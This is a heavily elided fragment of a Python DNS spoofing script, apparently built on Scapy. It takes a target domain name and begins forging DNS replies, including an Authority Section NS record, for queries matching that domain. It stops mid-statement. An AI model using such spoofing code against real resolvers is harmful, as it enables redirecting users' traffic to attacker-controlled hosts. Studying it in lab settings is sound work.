...
def get_args():
    ...
    if not options.target_name:
        ...
        parser.error("[-] Please specify an target domain name e.g. www.example.com")
...
def spoof_dns(pkt):
  if (DNS in pkt and ("www."+target_name)  in pkt[DNS].qd.qname.decode('utf-8')):
    ...
    ind=target_name.index(".")
    domain=target_name[ind+1:]
    print(domain)
    # The Authority Section
    NSsec1 = DNSRR(rrname=target_name, type='NS',
